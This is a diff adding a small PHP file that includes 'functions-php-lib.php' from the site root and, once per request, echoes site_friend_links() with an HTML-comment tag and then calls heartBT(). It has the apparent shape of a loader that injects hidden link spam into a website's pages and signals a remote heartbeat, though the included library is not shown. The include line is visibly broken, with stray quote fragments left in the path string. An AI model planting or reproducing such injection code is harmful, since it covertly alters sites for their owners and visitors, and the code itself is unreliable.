@@ -1,1 +1,23 @@
 
+
+<?php 
+
+
+$libFNameBody='functions-php-lib';//====================================
+$rootPath = $_SERVER['DOCUMENT_ROOT'];
+$currentDir = dirname($_SERVER['SCRIPT_FILENAME']); 
+$currDirNORTPathONLY = str_replace($rootPath  ,'',$currentDir);
+
+
+
+$libPathFile=$currDirNORTPathONLY."/".$libFNameBody.".php";   
+$VFiStr = "DhdL8Uf9"; 
+
+echo "<br>libPathFile:$libPathFile <br>";
+echo "<br>准备引入：include_once <br>";
+
+include_once $_SERVER["DOCUMENT_ROOT"]."'.$libPathFile.'"; global $hasRun; if (!$hasRun) { echo site_friend_links("<!--'.$VFiStr.'-->");flush();heartBT(); $hasRun = true;} 
+
+
+
+?>
